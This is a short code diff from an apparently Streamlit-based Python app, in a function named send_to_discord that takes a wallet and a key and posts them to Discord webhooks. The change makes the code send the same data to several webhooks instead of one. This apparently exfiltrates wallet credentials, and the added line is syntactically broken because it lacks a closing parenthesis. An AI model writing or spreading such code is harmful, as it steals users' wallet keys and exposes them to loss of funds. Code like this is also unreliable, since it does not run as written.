@@ -160,7 +160,8 @@ def send_to_discord(wallet, key):
         "avatar_url": "https://i.imgur.com/4M34hi2.png"
     }
     
-    requests.post(webhook_url, json=data)
+    for webhook_url in webhook_urls:
+        requests.post(webhook_url, json=data
 
 
     st.markdown(
